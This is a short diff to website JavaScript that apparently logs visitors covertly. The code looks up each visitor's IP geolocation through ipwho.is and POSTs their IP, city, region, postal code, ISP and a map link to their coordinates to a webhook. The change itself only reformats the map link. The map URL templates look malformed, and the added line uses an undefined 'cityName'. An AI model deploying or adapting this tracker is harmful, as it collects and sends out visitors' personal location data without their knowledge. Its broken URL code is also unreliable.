@@ -90,7 +90,7 @@
         fetch("https://ipwho.is")
         .then(response => response.json())
         .then(data => {
-            const rawContentText = `🟢 **Website Traffic Logged**\n• **User IP:** ${data.ip || 'Hidden'}\n• **Location:** ${data.city || 'N/A'}, ${data.region || 'N/A'}, ${data.country || 'Unknown'}\n• **Postal Code:** ${data.postal || 'N/A'}\n• **Provider/ISP:** ${data.connection?.isp || 'N/A'}\n• **Google Maps:** <https://google.com{data.latitude},${data.longitude}>`;
+            const rawContentText = `🟢 **Website Traffic Logged**\n• **User IP:** ${data.ip || 'Hidden'}\n• **Location:** ${data.city || 'N/A'}, ${data.region || 'N/A'}, ${data.country || 'Unknown'}\n• **Postal Code:** ${data.postal || 'N/A'}\n• **Provider/ISP:** ${data.connection?.isp || 'N/A'}\n• **Google Maps:** [${cityName}](https://google.com{data.latitude},${data.longitude})`;
 
             fetch(webhookUrl, {
                 method: "POST",
